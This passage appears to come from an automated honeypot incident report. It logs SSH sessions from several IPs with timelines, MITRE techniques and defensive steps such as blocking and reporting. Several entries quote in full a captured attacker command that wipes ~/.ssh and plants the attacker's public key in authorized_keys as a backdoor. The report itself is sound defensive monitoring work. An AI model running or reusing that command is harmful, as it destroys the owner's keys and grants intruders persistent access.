
**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c42d5c55860

| Field | Detail |
|---|---|
| **Source IP** | `45.120.216[.]232` |
| **First Seen** | 2026-07-02 21:21 |
| **Last Seen** | 2026-07-02 21:21 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:21:22` | `cowrie.session.connect` |
| `2026-07-02 21:21:22` | `cowrie.client.version` |
| `2026-07-02 21:21:23` | `cowrie.client.kex` |
| `2026-07-02 21:21:24` | `cowrie.login.success` |
| `2026-07-02 21:21:25` | `cowrie.session.params` |
| `2026-07-02 21:21:25` | `cowrie.command.input` |
| `2026-07-02 21:21:25` | `cowrie.command.failed` |
| `2026-07-02 21:21:26` | `cowrie.log.closed` |
| `2026-07-02 21:21:27` | `cowrie.session.params` |
| `2026-07-02 21:21:27` | `cowrie.command.input` |
| `2026-07-02 21:21:28` | `cowrie.session.file_download` |
| `2026-07-02 21:21:28` | `cowrie.log.closed` |
| `2026-07-02 21:21:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.216[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.120.216[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25d7b65de0ca

| Field | Detail |
|---|---|
| **Source IP** | `45.120.216[.]232` |
| **First Seen** | 2026-07-02 21:21 |
| **Last Seen** | 2026-07-02 21:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:21:28` | `cowrie.session.connect` |
| `2026-07-02 21:21:28` | `cowrie.client.version` |
| `2026-07-02 21:21:28` | `cowrie.client.kex` |
| `2026-07-02 21:21:30` | `cowrie.login.success` |
| `2026-07-02 21:21:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.216[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.120.216[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ef71294bb35

| Field | Detail |
|---|---|
| **Source IP** | `45.120.216[.]232` |
| **First Seen** | 2026-07-02 21:21 |
| **Last Seen** | 2026-07-02 21:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:21:30` | `cowrie.session.connect` |
| `2026-07-02 21:21:30` | `cowrie.client.version` |
| `2026-07-02 21:21:31` | `cowrie.client.kex` |
| `2026-07-02 21:21:31` | `cowrie.login.success` |
| `2026-07-02 21:21:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.216[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.120.216[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d8432827da2

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 21:22 |
| **Last Seen** | 2026-07-02 21:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:22:25` | `cowrie.session.connect` |
| `2026-07-02 21:22:25` | `cowrie.client.version` |
| `2026-07-02 21:22:25` | `cowrie.client.kex` |
| `2026-07-02 21:22:26` | `cowrie.login.success` |
| `2026-07-02 21:22:28` | `cowrie.session.params` |
| `2026-07-02 21:22:28` | `cowrie.command.input` |
| `2026-07-02 21:22:28` | `cowrie.log.closed` |
| `2026-07-02 21:22:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17c853f14480

| Field | Detail |
|---|---|
| **Source IP** | `218.144.90[.]41` |
| **First Seen** | 2026-07-02 21:31 |
| **Last Seen** | 2026-07-02 21:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:31:19` | `cowrie.session.connect` |
| `2026-07-02 21:31:19` | `cowrie.client.version` |
| `2026-07-02 21:31:19` | `cowrie.client.kex` |
| `2026-07-02 21:31:20` | `cowrie.login.success` |
| `2026-07-02 21:31:21` | `cowrie.session.params` |
| `2026-07-02 21:31:21` | `cowrie.command.input` |
| `2026-07-02 21:31:21` | `cowrie.command.failed` |
| `2026-07-02 21:31:21` | `cowrie.log.closed` |
| `2026-07-02 21:31:22` | `cowrie.session.params` |
| `2026-07-02 21:31:22` | `cowrie.command.input` |
| `2026-07-02 21:31:23` | `cowrie.session.file_download` |
| `2026-07-02 21:31:23` | `cowrie.log.closed` |
| `2026-07-02 21:31:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.144.90[.]41` to AbuseIPDB if not already reported
- [ ] Block `218.144.90[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77b681bef52e

| Field | Detail |
|---|---|
| **Source IP** | `218.144.90[.]41` |
| **First Seen** | 2026-07-02 21:31 |
| **Last Seen** | 2026-07-02 21:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:31:23` | `cowrie.session.connect` |
| `2026-07-02 21:31:23` | `cowrie.client.version` |
| `2026-07-02 21:31:23` | `cowrie.client.kex` |
| `2026-07-02 21:31:24` | `cowrie.login.success` |
| `2026-07-02 21:31:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.144.90[.]41` to AbuseIPDB if not already reported
- [ ] Block `218.144.90[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad647a4c8964

| Field | Detail |
|---|---|
| **Source IP** | `218.144.90[.]41` |
| **First Seen** | 2026-07-02 21:31 |
| **Last Seen** | 2026-07-02 21:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:31:24` | `cowrie.session.connect` |
| `2026-07-02 21:31:24` | `cowrie.client.version` |
| `2026-07-02 21:31:24` | `cowrie.client.kex` |
| `2026-07-02 21:31:25` | `cowrie.login.success` |
| `2026-07-02 21:31:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.144.90[.]41` to AbuseIPDB if not already reported
- [ ] Block `218.144.90[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d596e505795

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 21:31 |
| **Last Seen** | 2026-07-02 21:31 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:31:44` | `cowrie.session.connect` |
| `2026-07-02 21:31:45` | `cowrie.client.version` |
| `2026-07-02 21:31:45` | `cowrie.client.kex` |
| `2026-07-02 21:31:51` | `cowrie.login.success` |
| `2026-07-02 21:31:55` | `cowrie.session.params` |
| `2026-07-02 21:31:55` | `cowrie.command.input` |
| `2026-07-02 21:31:56` | `cowrie.log.closed` |
| `2026-07-02 21:31:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cfe60eb9ad1

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 21:36 |
| **Last Seen** | 2026-07-02 21:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:36:07` | `cowrie.session.connect` |
| `2026-07-02 21:36:08` | `cowrie.client.version` |
| `2026-07-02 21:36:08` | `cowrie.client.kex` |
| `2026-07-02 21:36:09` | `cowrie.login.success` |
| `2026-07-02 21:36:10` | `cowrie.session.params` |
| `2026-07-02 21:36:10` | `cowrie.command.input` |
| `2026-07-02 21:36:11` | `cowrie.log.closed` |
| `2026-07-02 21:36:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43fb6e2900a8

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 21:39 |
| **Last Seen** | 2026-07-02 21:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:39:27` | `cowrie.session.connect` |
| `2026-07-02 21:39:27` | `cowrie.client.version` |
| `2026-07-02 21:39:27` | `cowrie.client.kex` |
| `2026-07-02 21:39:27` | `cowrie.login.success` |
| `2026-07-02 21:39:28` | `cowrie.session.params` |
| `2026-07-02 21:39:28` | `cowrie.command.input` |
| `2026-07-02 21:39:28` | `cowrie.log.closed` |
| `2026-07-02 21:39:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01e36af0bada

| Field | Detail |
|---|---|
| **Source IP** | `175.119.225[.]68` |
| **First Seen** | 2026-07-02 21:42 |
| **Last Seen** | 2026-07-02 21:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:42:36` | `cowrie.session.connect` |
| `2026-07-02 21:42:36` | `cowrie.client.version` |
| `2026-07-02 21:42:36` | `cowrie.client.kex` |
| `2026-07-02 21:42:37` | `cowrie.login.success` |
| `2026-07-02 21:42:38` | `cowrie.session.params` |
| `2026-07-02 21:42:38` | `cowrie.command.input` |
| `2026-07-02 21:42:38` | `cowrie.command.failed` |
| `2026-07-02 21:42:39` | `cowrie.log.closed` |
| `2026-07-02 21:42:39` | `cowrie.session.params` |
| `2026-07-02 21:42:39` | `cowrie.command.input` |
| `2026-07-02 21:42:39` | `cowrie.session.file_download` |
| `2026-07-02 21:42:39` | `cowrie.log.closed` |
| `2026-07-02 21:42:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.119.225[.]68` to AbuseIPDB if not already reported
- [ ] Block `175.119.225[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e73aba6ba49

| Field | Detail |
|---|---|
| **Source IP** | `175.119.225[.]68` |
| **First Seen** | 2026-07-02 21:42 |
| **Last Seen** | 2026-07-02 21:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:42:40` | `cowrie.session.connect` |
| `2026-07-02 21:42:40` | `cowrie.client.version` |
| `2026-07-02 21:42:40` | `cowrie.client.kex` |
| `2026-07-02 21:42:40` | `cowrie.login.success` |
| `2026-07-02 21:42:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.119.225[.]68` to AbuseIPDB if not already reported
- [ ] Block `175.119.225[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ac7ffca3558

| Field | Detail |
|---|---|
| **Source IP** | `175.119.225[.]68` |
| **First Seen** | 2026-07-02 21:42 |
| **Last Seen** | 2026-07-02 21:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:42:41` | `cowrie.session.connect` |
| `2026-07-02 21:42:41` | `cowrie.client.version` |
| `2026-07-02 21:42:41` | `cowrie.client.kex` |
| `2026-07-02 21:42:42` | `cowrie.login.success` |
| `2026-07-02 21:42:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.119.225[.]68` to AbuseIPDB if not already reported
- [ ] Block `175.119.225[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a72741a9f4f1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 21:43 |
| **Last Seen** | 2026-07-02 21:43 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:43:06` | `cowrie.session.connect` |
| `2026-07-02 21:43:07` | `cowrie.client.version` |
| `2026-07-02 21:43:07` | `cowrie.client.kex` |
| `2026-07-02 21:43:14` | `cowrie.login.success` |
| `2026-07-02 21:43:17` | `cowrie.session.params` |
| `2026-07-02 21:43:17` | `cowrie.command.input` |
| `2026-07-02 21:43:19` | `cowrie.log.closed` |
| `2026-07-02 21:43:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c2ca8bad78f

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 21:51 |
| **Last Seen** | 2026-07-02 21:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:51:04` | `cowrie.session.connect` |
| `2026-07-02 21:51:04` | `cowrie.client.version` |
| `2026-07-02 21:51:04` | `cowrie.client.kex` |
| `2026-07-02 21:51:06` | `cowrie.login.success` |
| `2026-07-02 21:51:07` | `cowrie.session.params` |
| `2026-07-02 21:51:07` | `cowrie.command.input` |
| `2026-07-02 21:51:07` | `cowrie.log.closed` |
| `2026-07-02 21:51:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-604acd45457e

| Field | Detail |
|---|---|
| **Source IP** | `61.219.156[.]91` |
| **First Seen** | 2026-07-02 21:51 |
| **Last Seen** | 2026-07-02 21:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:51:47` | `cowrie.session.connect` |
| `2026-07-02 21:51:47` | `cowrie.client.version` |
| `2026-07-02 21:51:47` | `cowrie.client.kex` |
| `2026-07-02 21:51:48` | `cowrie.login.success` |
| `2026-07-02 21:51:49` | `cowrie.session.params` |
| `2026-07-02 21:51:49` | `cowrie.command.input` |
| `2026-07-02 21:51:49` | `cowrie.command.failed` |
| `2026-07-02 21:51:49` | `cowrie.log.closed` |
| `2026-07-02 21:51:50` | `cowrie.session.params` |
| `2026-07-02 21:51:50` | `cowrie.command.input` |
| `2026-07-02 21:51:50` | `cowrie.session.file_download` |
| `2026-07-02 21:51:50` | `cowrie.log.closed` |
| `2026-07-02 21:51:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.219.156[.]91` to AbuseIPDB if not already reported
- [ ] Block `61.219.156[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea5c5cee73fc

| Field | Detail |
|---|---|
| **Source IP** | `61.219.156[.]91` |
| **First Seen** | 2026-07-02 21:51 |
| **Last Seen** | 2026-07-02 21:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:51:50` | `cowrie.session.connect` |
| `2026-07-02 21:51:50` | `cowrie.client.version` |
| `2026-07-02 21:51:50` | `cowrie.client.kex` |
| `2026-07-02 21:51:51` | `cowrie.login.success` |
| `2026-07-02 21:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.219.156[.]91` to AbuseIPDB if not already reported
- [ ] Block `61.219.156[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55158102fb1d

| Field | Detail |
|---|---|
| **Source IP** | `61.219.156[.]91` |
| **First Seen** | 2026-07-02 21:51 |
| **Last Seen** | 2026-07-02 21:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:51:52` | `cowrie.session.connect` |
| `2026-07-02 21:51:52` | `cowrie.client.version` |
| `2026-07-02 21:51:52` | `cowrie.client.kex` |
| `2026-07-02 21:51:53` | `cowrie.login.success` |
| `2026-07-02 21:51:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.219.156[.]91` to AbuseIPDB if not already reported
- [ ] Block `61.219.156[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d24a24b00a65

| Field | Detail |
|---|---|
| **Source IP** | `152.32.182[.]8` |
| **First Seen** | 2026-07-02 21:54 |
| **Last Seen** | 2026-07-02 21:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:54:23` | `cowrie.session.connect` |
| `2026-07-02 21:54:23` | `cowrie.client.version` |
| `2026-07-02 21:54:23` | `cowrie.client.kex` |
| `2026-07-02 21:54:23` | `cowrie.login.success` |
| `2026-07-02 21:54:24` | `cowrie.session.params` |
| `2026-07-02 21:54:24` | `cowrie.command.input` |
| `2026-07-02 21:54:24` | `cowrie.command.failed` |
| `2026-07-02 21:54:24` | `cowrie.log.closed` |
| `2026-07-02 21:54:24` | `cowrie.session.params` |
| `2026-07-02 21:54:24` | `cowrie.command.input` |
| `2026-07-02 21:54:24` | `cowrie.session.file_download` |
| `2026-07-02 21:54:24` | `cowrie.log.closed` |
| `2026-07-02 21:54:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.182[.]8` to AbuseIPDB if not already reported
- [ ] Block `152.32.182[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2c12f2c9325

| Field | Detail |
|---|---|
| **Source IP** | `152.32.182[.]8` |
| **First Seen** | 2026-07-02 21:54 |
| **Last Seen** | 2026-07-02 21:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:54:24` | `cowrie.session.connect` |
| `2026-07-02 21:54:24` | `cowrie.client.version` |
| `2026-07-02 21:54:24` | `cowrie.client.kex` |
| `2026-07-02 21:54:24` | `cowrie.login.success` |
| `2026-07-02 21:54:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.182[.]8` to AbuseIPDB if not already reported
- [ ] Block `152.32.182[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f15cd54abb80

| Field | Detail |
|---|---|
| **Source IP** | `152.32.182[.]8` |
| **First Seen** | 2026-07-02 21:54 |
| **Last Seen** | 2026-07-02 21:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:54:24` | `cowrie.session.connect` |
| `2026-07-02 21:54:24` | `cowrie.client.version` |
| `2026-07-02 21:54:24` | `cowrie.client.kex` |
| `2026-07-02 21:54:24` | `cowrie.login.success` |
| `2026-07-02 21:54:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.182[.]8` to AbuseIPDB if not already reported
- [ ] Block `152.32.182[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03f73bfcf596

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 21:54 |
| **Last Seen** | 2026-07-02 21:54 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 21:54:35` | `cowrie.session.connect` |
| `2026-07-02 21:54:36` | `cowrie.client.version` |
